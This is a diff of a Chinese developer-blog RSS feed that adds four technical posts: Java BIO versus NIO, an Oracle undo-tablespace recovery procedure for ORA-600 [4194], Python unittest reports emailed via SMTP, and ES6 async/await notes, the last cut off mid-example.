@@ -9,6 +9,1075 @@
 <link></link>
 <description>代码改变世界</description>
 <item>
+<title>IO 和 NIO 的思考 - wskwbog</title>
+<link>http://www.cnblogs.com/wskwbog/p/10539782.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/wskwbog/p/10539782.html</guid>
+<description>&lt;p&gt;输入输出是操作系统不可或缺的一部分，大致分为两类：面向磁盘和面向网络。在 Java 中有3种 I/O 类型：BIO、NIO 和 AIO，分别是同步阻塞、同步非阻塞和异步非阻塞 I/O，这里着重描述 BIO 和 NIO 的区别和常用的编程模型。&lt;/p&gt;
+&lt;h2 id=&quot;为什么设计-nio&quot;&gt;1. 为什么设计 NIO&lt;/h2&gt;
+&lt;p&gt;一个直接原因就是为了更好的利用操作系统特性，改善和扩展原有 API。与 NIO 相关的规范有两个：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://jcp.org/en/jsr/detail?id=51&quot;&gt;JSR 51&lt;/a&gt;：它是 NIO 的第一个规范，关注缓冲区、通道和字符集的设计，引入一个简单的面向缓冲区的 I/O 模型，并且提供一套非阻塞、I/O 多路复用、可扩展的 API&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://jcp.org/en/jsr/detail?id=203&quot;&gt;JSR 203(NIO.2)&lt;/a&gt;：它在前者的基础上，添加新的文件系统的抽象，完善现有 Socket 通道的配置，添加多播数据报的支持，并且定义了一个异步 I/O 编程 API&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;那么，传统的 BIO 又有什么弊端？NIO 又是如何改进的？可以从两方面进行说明。&lt;/p&gt;
+&lt;h3 id=&quot;文件操作&quot;&gt;1.2 文件操作&lt;/h3&gt;
+&lt;p&gt;关于 java.io.file，它的不足之处在于：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;查询文件属性时，如修改时间或文件类型，都会发生系统调用，并且这些组合操作非常常见，造成性能问题&lt;/li&gt;
+&lt;li&gt;部分方法在发生错误时返回 false 而不是抛出异常，比如 delete、rename，不知操作失败的原因&lt;/li&gt;
+&lt;li&gt;一些 OS 高级功能不支持，比如符号链接、文件锁定、内存映射等&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;而 NIO 支持批量获取文件属性，对文件、目录的处理也重新设计，提供 FileLock、MappedByteBuffer 等支持 OS 高级功能。&lt;/p&gt;
+&lt;h3 id=&quot;网络通信&quot;&gt;1.3 网络通信&lt;/h3&gt;
+&lt;p&gt;BIO 是同步阻塞、基于流的 I/O，阻塞就意味着当 Socket 输入流中无数据可读取时，调用线程挂起，直到有数据读取，期间不能处理其他请求，如果来了一个新连接，就只能再新建一个线程处理。&lt;/p&gt;
+&lt;p&gt;随着连接数的增加，BIO 将会创建大量线程，而一个计算机能打开的进程数或线程数是有限的，严重的时候可能会导致应用崩溃无响应。一个有效的解决办法是使用线程池，限制最大线程数，但它同时也限制了最大连接数。&lt;/p&gt;
+&lt;p&gt;NIO 将读写改为非阻塞，无数据可读，线程返回线程池，可用于处理其他连接。它对原始 I/O 提供了新的抽象 - Channel（通道），并且提供基于缓冲区的读写 API。Channel 表示一个到硬件设备、文件或网络套接字的连接，与 java.net.Socket 的区别是：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;可配置非阻塞，允许&lt;strong&gt;事件驱动&lt;/strong&gt;的设计，提供了一种更加可扩展的服务器开发&lt;/li&gt;
+&lt;li&gt;面向缓冲区，可实现&lt;strong&gt;零拷贝&lt;/strong&gt;执行 I/O ，只不过有一端必须是 FileChannel&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;相同环境下，BIO 的线程全程只处理一条连接，而 NIO 的线程可处理多个连接，提高了系统的吞吐能力。NIO 在服务器进行纵向扩展（比如增加内存、CPU）或者横向扩展（比如增加服务器）往往能够比 BIO 带来更高的处理能力，使服务器具有更强的可扩展性和可伸缩性。&lt;/p&gt;
+&lt;h3 id=&quot;零拷贝&quot;&gt;1.4 零拷贝&lt;/h3&gt;
+&lt;p&gt;NIO 还有一个零拷贝的概念，零拷贝是指 CPU 不执行将数据从一个存储区复制到另一个存储区的操作。OS 级别的零拷贝指的是将数据发送到硬件驱动程序（网卡或磁盘驱动器）时避免从一个位置&lt;strong&gt;复制&lt;/strong&gt;到另一个位置（一般是从用户空间到内核空间），反之亦然。NIO 中的零拷贝就是这样，只不过它只针对在网络上发送文件。&lt;/p&gt;
+&lt;h2 id=&quot;io-模型的选择&quot;&gt;2. I/O 模型的选择&lt;/h2&gt;
+&lt;p&gt;一般的，我们潜意识的会认为 NIO 比 BIO 的性能高，其实不尽然，当然了有个读取方式的问题，read(byte[]) 和 read(ByteBuffer)应该没区别吧？所以如果系统的并发量不高，两个用谁都行。&lt;/p&gt;
+&lt;p&gt;BIO 的问题通常会在海量的连接下体现出来，由于它不能充分利用、压榨一台服务器的性能，不管怎么扩展，它能处理的连接数与机器性能往往是非线性的，付出和收获不成正比。如果你的应用面临的连接不断增加，特别是存在大量的长连接，此时就要选择 NIO，它不仅提高了单机处理能力，还能节省服务器成本。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;NIO 相比 BIO 的重点在于可扩展性&lt;/strong&gt;，在选择 I/O 模型时，需要结合业务场景，综合考虑以下几点：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;预计最大的并发数&lt;/li&gt;
+&lt;li&gt;短连接还是长连接&lt;/li&gt;
+&lt;li&gt;预计每个连接的数据量，即流量的大小&lt;/li&gt;
+&lt;li&gt;NIO 灵活，但代价是编程复杂&lt;/li&gt;
+&lt;/ul&gt;&lt;h2 id=&quot;编程模型&quot;&gt;3. 编程模型&lt;/h2&gt;
+&lt;p&gt;BIO 的编程模型是一连接一处理线程，采用线程池优化。&lt;/p&gt;
+&lt;p&gt;NIO 典型的编程模型是 &lt;strong&gt;Reactor&lt;/strong&gt;，事件复用器通知套接字何时准备好读取和写入操作的事件，将事件传递给合适的处理程序，由该程序负责实际的读取或写入。对于读操作基本过程如下：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;处理程序声明感兴趣的 I/O 事件 - 读取事件&lt;/li&gt;
+&lt;li&gt;事件复用器等待事件&lt;/li&gt;
+&lt;li&gt;一个事件发生，复用器被唤醒并调用适当的处理程序&lt;/li&gt;
+&lt;li&gt;处理程序执行实际的读取操作，处理读取的数据，重新声明关注的 I/O 事件，并将控制权返回给调度程序&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;与 Reactor 相对的还有一个 AIO 的 &lt;strong&gt;Proactor&lt;/strong&gt; 模型，它是&lt;strong&gt;异步 I/O&lt;/strong&gt;，事件复用器等待 I/O 操作完成的事件，它是真正的异步，因为实际的 I/O 操作完全由操作系统执行。对于读操作，它的做法是：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;处理程序启动异步读取操作，在这种情况下，处理程序不关心 I/O 就绪事件，而是关注接收完成的事件&lt;/li&gt;
+&lt;li&gt;事件复用器等待操作完成&lt;/li&gt;
+&lt;li&gt;当事件复用器等待时，OS 并行的在内核线程中执行读操作，将数据放入用户定义的缓冲区，读取完成后通知事件多路复用器&lt;/li&gt;
+&lt;li&gt;事件复用器调用适当的处理程序&lt;/li&gt;
+&lt;li&gt;处理程序处理用户定义缓冲区的数据，启动新的异步操作，并将控制返回给事件多路复用器&lt;/li&gt;
+&lt;/ul&gt;&lt;h2 id=&quot;小结&quot;&gt;4. 小结&lt;/h2&gt;
+&lt;p&gt;I/O 模型经常对比的是阻塞和非阻塞，还有同步和异步，在《UNIX 网络编程》第6章已经给出了它们的区别，并且给出的图示很直观。这里简单做下说明，以 UDP 为例，读取一个数据包可以分为两个阶段：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;第一阶段：应用进程发起系统调用，内核无数据包准备好，等待数据&lt;/li&gt;
+&lt;li&gt;第二阶段：数据包准备好，OS 将数据从内核复制到用户空间&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;阻塞和非阻塞描述的是第一阶段无数据可读取时线程是否挂起；同步和异步描述的是第二阶段，在数据复制过程中线程是否参与和挂起。注意 NIO/BIO 都是同步 I/O，NIO 对应 UNP 中描述的 I/O 复用模型。&lt;/p&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 23:37:00 +0000</pubDate>
+<dc:creator>wskwbog</dc:creator>
+<og:description>输入输出是操作系统不可或缺的一部分，大致分为两类：面向磁盘和面向网络。在 Java 中有3种 I/O 类型：BIO、NIO 和 AIO，分别是同步阻塞、同步非阻塞和异步非阻塞 I/O，这里着重描述 B</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/wskwbog/p/10539782.html</dc:identifier>
+</item>
+<item>
+<title>Oracle创建新undo表空间最佳实践(包含段检查) - AlfredZhao</title>
+<link>http://www.cnblogs.com/jyzhao/p/10727336.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/jyzhao/p/10727336.html</guid>
+<description>&lt;p&gt;在处理一则ORA-600 [4194]案例时，参考MOS文档：Step by step to resolve ORA-600 4194 4193 4197 on database crash (文档 ID 1428786.1)&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;code&gt;The following error is occurring in the alert.log right before the database crashes.
+ORA-00600: internal error code, arguments: [4194], [#], [#], [], [], [], [], []
+ 
+This error indicates that a mismatch has been detected between redo records and rollback (undo) records.
+
+ARGUMENTS:
+
+Arg [a] - Maximum Undo record number in Undo block
+Arg [b] - Undo record number from Redo block
+
+Since we are adding a new undo record to our undo block, we would expect that the new record number is equal to the maximum record number in the undo block plus one. Before Oracle can add a new undo record to the undo block it validates that this is correct. If this validation fails, then an ORA-600 [4194] will be triggered.&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;可以看到，此错误是因为redo和undo的记录不匹配。常见于异常断电等场景。&lt;/p&gt;
+
+&lt;p&gt;Best practice to create a new undo tablespace.&lt;br/&gt;his method includes segment check.&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;1. Create pfile from spfile to edit
+SQL&amp;gt; Create pfile='/tmp/initsid.ora' from spfile;
+
+2. Shutdown the instance
+
+3. set the following parameters in the pfile /tmp/initsid.ora
+    undo_management = manual
+    event = '10513 trace name context forever, level 2'
+
+4. SQL&amp;gt;&amp;gt;startup restrict pfile='/tmp/initsid.ora'
+
+5. SQL&amp;gt;select tablespace_name, status, segment_name from dba_rollback_segs where status != 'OFFLINE';
+
+This is critical - we are looking for all undo segments to be offline - System will always be online.
+
+If any are 'PARTLY AVAILABLE' or 'NEEDS RECOVERY' - Please open an issue with Oracle Support or update the current SR.  There are many options from this moment and Oracle Support Analyst can offer different solutions for the bad undo segments.
+
+If all offline then continue to the next step
+
+6. Create new undo tablespace - example
+SQL&amp;gt;create undo tablespace &amp;lt;new undo tablespace&amp;gt; datafile &amp;lt;datafile&amp;gt; size 2000M;
+
+7. Drop old undo tablespace
+SQL&amp;gt;drop tablespace &amp;lt;old undo tablespace&amp;gt; including contents and datafiles;
+
+8. SQL&amp;gt;shutdown immediate;
+
+9 SQL&amp;gt;startup nomount;  --&amp;gt; Using your Original spfile
+
+10. Modify the spfile with the new undo tablespace name
+
+SQL&amp;gt; Alter system set undo_tablespace = '&amp;lt;new tablespace created in step 6&amp;gt;' scope=spfile;
+
+11. SQL&amp;gt;shutdown immediate;
+
+12. SQL&amp;gt;startup;  --&amp;gt; Using spfile&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;相关随笔参考：&lt;/strong&gt;&lt;/p&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 21:50:00 +0000</pubDate>
+<dc:creator>AlfredZhao</dc:creator>
+<og:description>在处理一则ORA 600 [4194]案例时，参考MOS文档：Step by step to resolve ORA 600 4194 4193 4197 on database crash (文档</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/jyzhao/p/10727336.html</dc:identifier>
+</item>
+<item>
+<title>Python3+unitest自动化测试初探（中篇） - 秦无殇</title>
+<link>http://www.cnblogs.com/webDepOfQWS/p/10725194.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/webDepOfQWS/p/10725194.html</guid>
+<description>&lt;hr/&gt;&lt;p&gt;本篇随笔承接：Python3+unitest自动化测试初探（上篇）&lt;/p&gt;
+&lt;p&gt;地址：&lt;a href=&quot;https://www.cnblogs.com/webDepOfQWS/p/10707299.html&quot; target=&quot;_blank&quot;&gt;Python3+unitest自动化测试初探（上篇）&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;生成测试报告&quot;&gt;6、生成测试报告&lt;/h3&gt;
+&lt;h4 id=&quot;下载htmltestrunner.py&quot;&gt;6.1、下载HTMLTestRunner.py&lt;/h4&gt;
+&lt;p&gt;原版下载地址：http://tungwaiyip.info/software/HTMLTestRunner.html&lt;br/&gt;原版的只支持Python 2.x版本，Python 3.x版本需要做适配&lt;/p&gt;
+&lt;p&gt;适配后的下载地址：https://github.com/Slience007/pyunitest/blob/master/untils/HTMLTestRunner.py&lt;/p&gt;
+&lt;h4 id=&quot;安装htmltestrunner.py&quot;&gt;6.2、安装HTMLTestRunner.py&lt;/h4&gt;
+&lt;p&gt;安装方法比较简单，将HTMLTestRunner.py放到sys.path路径下即可。ubuntu下，我放到了如下路径：/usr/lib/python3.7。&lt;/p&gt;
+&lt;h4 id=&quot;生成报告&quot;&gt;6.3、生成报告&lt;/h4&gt;
+&lt;p&gt;HTMLTestRunner.py提供HTMLTestRunner()类来代替unittest.TextTestRunner()执行用例，修改后的run.py的代码如下：&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;#coding:utf-8
+import  unittest
+#导入HTMLTestRunner
+from HTMLTestRunner import  HTMLTestRunner
+#从testCase包里面导入测试类
+from testCases.userLoginTest import loginTest
+from testCases.userRegTest import regTest
+
+#构造测试套
+def suite():
+    suite = unittest.TestSuite()
+    suite.addTest(loginTest(&quot;test_loginsucess_L0&quot;))
+    suite.addTest(loginTest(&quot;test_pwdwrong_L0&quot;))
+    suite.addTest(loginTest(&quot;test_statuserr_L1&quot;))
+    suite.addTest(regTest(&quot;test_pwdlenerr_L1&quot;))
+    suite.addTest(regTest(&quot;test_regsucess_L0&quot;))
+    suite.addTest(regTest(&quot;test_regagain_L1&quot;))
+    return suite
+
+#运行测试用例
+if __name__ == '__main__':
+    # runner = unittest.TextTestRunner()
+    # #调用test runner的run方法执行用例
+    # runner.run(suite())
+    #以二进制格式打开TestReport.html用于写入数据
+    with open(&quot;./TestReport.html&quot;,&quot;wb&quot;) as f:
+        runner = HTMLTestRunner(stream=f,title=&quot;Reg And Login Test Report&quot;)
+        runner.run(suite())
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;运行run.py后，打开TestReport.html，查看生成的测试报告。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190417175736649-1163701788.png&quot;/&gt;&lt;/p&gt;
+&lt;h3 id=&quot;编写邮件发送工具&quot;&gt;7、编写邮件发送工具&lt;/h3&gt;
+&lt;p&gt;在Project下新建包utils用来封装一些常用的工具，在utils下新建Python文件emailUtil.py。定义sendEmail类。这个类主要包含3个方法：&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;&lt;strong&gt;init&lt;/strong&gt;()：初始化&lt;/li&gt;
+&lt;li&gt;writeEmail()：构造邮件主题，邮件正文，添加邮件附件。&lt;/li&gt;
+&lt;li&gt;sendEmail()：连接邮件服务器，认证，发送邮件。我采用的是网易邮件服务器，其地址是smtp.126.com。收件地址为QQ邮箱。&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;[ 代码如下：]emailUtil.py&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;#coding:utf-8
+'''
+email模块负责构造邮件内容
+smtplib模块负责发送邮件
+'''
+from email.mime.text import  MIMEText
+from email.mime.multipart import MIMEMultipart
+import smtplib
+from email.header import Header
+
+class sendEmail():
+    #定义全局变量邮件服务器地址，登录用户，授权码
+    global MAILHOST,MAILUSER,MAILPWD
+    MAILHOST = &quot;smtp.126.com&quot;
+    MAILUSER = &quot;××××@126.com&quot;
+    MAILPWD = &quot;×××&quot;
+
+    def __init__(self,subject,content,reveiver,attachPath=&quot;&quot;):
+        self.subject = subject
+        self.content = content
+        self.receiver = reveiver
+        self.attachPath = attachPath
+    #写邮件,返回msg.as_string()
+    def writeEmail(self):
+        msg = MIMEMultipart()
+        #邮件正文
+        msg.attach(MIMEText(self.content, 'plain', 'utf8'))
+        receiverName = &quot;,&quot;.join(self.receiver)
+        msg['from'] = Header(MAILUSER,'utf-8')
+        #msg['to'] =  Header(&quot;,&quot;.join(self.receiver)).encode()
+        msg['to'] = Header(receiverName).encode()
+        #邮件主题
+        msg['Subject'] = Header(self.subject,'utf-8').encode()
+        #print(&quot;msg is:&quot;,msg)
+        #attachPath不为空则添加附件到邮件中
+        if self.attachPath != &quot;&quot;:
+            with open(self.attachPath, 'rb') as f:
+                attach1  = MIMEText(f.read(), 'base64', 'utf-8')
+                attach1[&quot;Content-Type&quot;] = 'application/octet-stream'
+                #filename可以随便写
+                attach1[&quot;Content-Disposition&quot;] = 'attachment; filename=&quot;Result.html&quot;'
+                msg.attach(attach1)
+
+        return msg.as_string()
+
+    #发送邮件
+    def sendEmail(self):
+        receiver = &quot;;&quot;.join(self.receiver)
+        try:
+            #连接邮件服务器
+            server = smtplib.SMTP()
+            server.connect(MAILHOST,25)
+            #打开debug模式可以看到握手过程
+            #server.set_debuglevel(1)
+            #登录，MAILPWD为网易邮件的授权码
+            server.login(MAILUSER,MAILPWD)
+            #发送邮件
+            server.sendmail(MAILUSER,receiver,self.writeEmail())
+            server.quit()
+            print(&quot;Email send sucess.&quot;)
+        except Exception as  e:
+            print(&quot;Email send fail.&quot;)
+            print(e)
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;在编写邮件工具的时候，碰到了一个错误：smtplib.SMTPDataError: (554, b'DT:SPM。原因可能是：邮件被网易邮件服务器当成了垃圾邮件。解决办法：邮件主题不能包含test，另外msg[from&quot;]，msg['to']要和server.sendmail(MAILUSER,receiver,self.writeEmail())中的MAILUSER和receiver保持一致。&lt;/p&gt;
+&lt;h3 id=&quot;发送邮件&quot;&gt;8、发送邮件&lt;/h3&gt;
+&lt;p&gt;在发送邮件之前，先获取本次执行用例总数，失败用例数，成功用例数，跳过的用例数。并计算出用例通过率。&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;suite().countTestCases()：获取用例总数。&lt;/li&gt;
+&lt;li&gt;runner.run(suite()).success_count：运行通过的用例数。&lt;/li&gt;
+&lt;li&gt;runner.run(suite()).failure_count：失败的用例数。&lt;/li&gt;
+&lt;li&gt;runner.run(suite()).skipped：返回的是跳过的用例list。&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;接下来来修改run.py ，需要先从utils模块导入sendEmail类，构造主题，邮件正文，指定收件人列表，指定测试报告的路径，之后调用sendEmail方法发送邮件。修改后的run.py代码如下：&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;#coding:utf-8
+import  unittest
+#导入HTMLTestRunner
+from HTMLTestRunner import  HTMLTestRunner
+#从testCase包里面导入测试类
+from testCases.userLoginTest import loginTest
+from testCases.userRegTest import regTest
+
+from utils.emailUtil import sendEmail
+#构造测试套
+def suite():
+    suite = unittest.TestSuite()
+    suite.addTest(loginTest(&quot;test_loginsucess_L0&quot;))
+    suite.addTest(loginTest(&quot;test_pwdwrong_L0&quot;))
+    suite.addTest(loginTest(&quot;test_statuserr_L1&quot;))
+    suite.addTest(regTest(&quot;test_pwdlenerr_L1&quot;))
+    suite.addTest(regTest(&quot;test_regsucess_L0&quot;))
+    suite.addTest(regTest(&quot;test_regagain_L1&quot;))
+    return suite
+
+#运行测试用例
+if __name__ == '__main__':
+    # runner = unittest.TextTestRunner()
+    # #调用test runner的run方法执行用例
+    # runner.run(suite())
+    #以二进制格式打开TestReport.html用于写入数据
+    with open(&quot;./TestReport.html&quot;,&quot;wb&quot;) as f:
+        runner = HTMLTestRunner(stream=f,title=&quot;Reg And Login Test Report&quot;)
+        result = runner.run(suite())
+        totalNums = suite().countTestCases()
+        passedNums = result.success_count
+        failedNums = result.failure_count
+        skippedNums = len(result.skipped)
+        #通过率，保留两位小数
+        passRate = round(passedNums * 100/  totalNums)
+        emailBody = &quot;Hi,all:\n \t本次构建一共运行：{totalNums}个用例，通过{passedNums}个，失败{failedNums}个，跳过{skippedNums}个。通过率：{passRate}%.\n \t详细信息请查看附件。&quot;
+        content = emailBody.format(totalNums=totalNums,passedNums=passedNums,failedNums=failedNums,skippedNums=skippedNums,passRate=passRate)
+        #收件人列表
+        receiver = ['××××@qq.com',&quot;×××××@126.com&quot;]
+        #测试报告的路径
+        path1 = &quot;/home/stephen/PycharmProjects/unitTestDemo/TestReport.html&quot;
+        subject = &quot;登录注册功能每日构建&quot;
+        e = sendEmail(subject,content,receiver,attachPath=path1)
+        #发送邮件
+        e.sendEmail()
+&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;运行run.py。登录邮箱查看已经发送成功的邮件。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190418011426950-334200648.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/631850/201904/631850-20190418014630817-965270225.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/webDepOfQWS/p/10725194.html#jump&quot;&gt;&lt;em&gt;点击这里返回本篇目录&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 17:41:00 +0000</pubDate>
+<dc:creator>秦无殇</dc:creator>
+<og:description>使用HTMLTestRunner生成详细的测试报告，编写邮件发送工具，构造邮件正文，包含运行用例的总数，通过用例数，失败用例数并计算出通过率。发送用例运行结果邮件。附件为详细的测试报告。</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/webDepOfQWS/p/10725194.html</dc:identifier>
+</item>
+<item>
+<title>es6学习笔记-async函数 - 热爱前端的17号诶</title>
+<link>http://www.cnblogs.com/sqh17/p/10727156.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/sqh17/p/10727156.html</guid>
+<description>&lt;h4 id=&quot;前情摘要&quot;&gt;1 前情摘要&lt;/h4&gt;
+&lt;p&gt;前段时间时间进行项目开发，需求安排不是很合理，导致一直高强度的加班工作，这一个月不是常说的996，简直是936，还好熬过来了。在此期间不是刚学会了es6的promise，在项目有用到promise的就一直都在用promise，爽的不要不要的，哈哈，项目到了最终阶段，不是很忙了，就开始自己的学习之路，好啦，废话到此为止，开始～&lt;/p&gt;
+&lt;h4 id=&quot;含义&quot;&gt;2 含义&lt;/h4&gt;
+&lt;p&gt;关于异步操作，在es6之前，一直都是&lt;br/&gt;回调函数，&lt;br/&gt;事件监听，&lt;br/&gt;发布/订阅&lt;br/&gt;promise对象&lt;br/&gt;（摘自es6的Generator函数的异步应用），这四个为主，再加上es6出来的promise对象以及后来的Generator函数，都可以解决异步编程。es7引入的async函数，使得异步操作变得更加方便&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;async函数，就是Generator 函数的语法糖&lt;/code&gt;，基于Generator 函数而来的，只是为了书写代码时更加流畅，增强代码的可读性。&lt;code&gt;async的返回值就是个promise对象&lt;/code&gt;，进一步说，async函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而await命令就是内部then命令的语法糖。&lt;/p&gt;
+&lt;h4 id=&quot;基本语法&quot;&gt;3 基本语法&lt;/h4&gt;
+&lt;p&gt;async函数返回一个 Promise 对象，可以使用then方法添加回调函数。当函数执行的时候，一旦遇到await就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;async function demo(val) {
+  let result = await `hello,${val}`;
+  return result;
+}
+demo('peter').then((val)=&amp;gt;{console.log(`${val},哈哈哈哈`)}) // hello,peter,哈哈哈哈
+console.log(demo('peter'))  // Promise{&amp;lt;pending&amp;gt;}&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;上述就是async的最基本语法，这看起来和普通的函数没有什么区别，只是多了两个关键字async和await,以及返回的promise的实例。&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;async&lt;br/&gt;是异步操作的说明，在普通函数名前面加上async代表了是一个异步操作，async函数返回一个 Promise 对象，async函数return语句返回的值，会成为then方法回调函数的参数&lt;/li&gt;
+&lt;/ul&gt;&lt;pre class=&quot;javascript&quot;&gt;
+&lt;code&gt;  async function f() {
+       return 123
+   }
+   f().then(v =&amp;gt; console.log(v)) // 123&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;将当于&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;  async function f() {
+      return await new Promise(function(resolve){
+          resolve(123)
+      })
+  }
+  f().then(v =&amp;gt; console.log(v)) // 123&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;也将当于&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;  async function f() {
+    return await Promise.resolve('123')
+  }
+  f().then(v =&amp;gt; console.log(v))&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;将async的return的值作为参数传递给then函数。&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;await&lt;br/&gt;await 可以理解为是 async wait 的简写。&lt;code&gt;await 必须出现在 async 函数内部，不能单独使用，否则会报错&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;&lt;pre class=&quot;javascript&quot;&gt;
+&lt;code&gt;    function foo() {
+       await 123;
+    }
+    foo(); //Uncaught SyntaxError: await is only valid in async function&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;这就是没有在函数名前面声明async报的错，相反的，声明了async，没有使用await不会报错&lt;/p&gt;
+&lt;p&gt;await 后面可以跟任何的JS 表达式。虽然说 await 可以是很多类型的东西，但是它最主要的意图是用来等待 Promise 对象的状态被 resolved。&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;async function foo() {}// 函数声明&lt;/li&gt;
+&lt;li&gt;const foo = async function () {};// 函数表达式&lt;/li&gt;
+&lt;li&gt;let obj = { async foo() {} };&lt;br/&gt;obj.foo().then(...)// 对象的方法&lt;/li&gt;
+&lt;li&gt;class Foo {// Class 的方法&lt;br/&gt;constructor() { }&lt;br/&gt;async foo(name) { }&lt;br/&gt;}&lt;/li&gt;
+&lt;li&gt;const foo = async () =&amp;gt; {};// 箭头函数&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;&lt;code&gt;如果await的是promise对象会造成异步函数停止执行并且等待promise的解决,如果等的是正常的表达式则立即执行。&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;另外：await命令后面的 Promise 对象如果变为reject状态，则reject的参数会被catch方法的回调函数接收到。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;async function f() {
+  await Promise.reject('出错了');
+}
+
+f()
+.then(v =&amp;gt; console.log(v))
+.catch(e =&amp;gt; console.log(e)) // 出错了&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;ps: &lt;code&gt;任何一个await语句后面的 Promise 对象变为reject状态，那么整个async函数都会中断执行。&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;async function f() {
+  await Promise.reject('出错了');
+  return await Promise.resolve('hello world');
+}
+f()
+.then(v =&amp;gt; console.log(v))
+.catch(e =&amp;gt; console.log(e)) // 出错了&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;上述代码在await的时候，实行了promise的reject方法，会直接终端执行，直接实行reject的方法&lt;/p&gt;
+&lt;h4 id=&quot;错误处理异常处理&quot;&gt;4 错误处理／异常处理&lt;/h4&gt;
+&lt;p&gt;防止出错的方法，也是将其放在try...catch代码块之中，这样又能实行剩下的部分。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;function time(ms){
+  if(ms&amp;lt;3000){
+    setTimeout(()=&amp;gt;{
+      console.log('ms',ms)
+      return ms
+    },ms)
+  }else{
+    return Promise.reject('出错了')
+  }
+}
+async function f() {
+  try {
+    let a = await time(1000)
+    let b = await time(2000)
+    let c = await time(3000)
+  } catch(e) {
+    console.log('e',e) // 'e' 出错了
+  }
+  return await('hello world');
+}
+f().then(val=&amp;gt;{
+  console.log(val) // hello world
+}).catch(val=&amp;gt;{
+  console.log(val)
+})&lt;/code&gt;
+&lt;/pre&gt;
+&lt;p&gt;先报错‘出错了’，再‘hello world’ 再依次打印出‘1000’，‘2000’&lt;br/&gt;因为有了reject之后，就无法往下进行,但是最后return是返回一个resolve的值给then()&lt;/p&gt;
+&lt;h4 id=&quot;注意点&quot;&gt;5 注意点&lt;/h4&gt;
+&lt;p&gt;有的注意点上面已经提到了，先总结如下：&lt;/p&gt;
+&lt;ul readability=&quot;12.5&quot;&gt;&lt;li&gt;await 必须出现在 async 函数内部，不能单独使用，否则会报错。&lt;/li&gt;
+&lt;li&gt;await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中，多个await也是如此。&lt;/li&gt;
+&lt;li readability=&quot;12&quot;&gt;
+&lt;p&gt;多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发,所谓的继发就是，不相互关联的异步操作，比如第一个异步的返回值给第二个异步这样的例子。&lt;/p&gt;
+&lt;pre&gt;
+&lt;code&gt;function time(ms){
+  return new Promise((resolve,reject)=&amp;gt;{
+    setTimeout(function(){
+      resolve()
+    },ms)
+  })
+}
+async function f() {
+  try {
+    let a = time(1000)
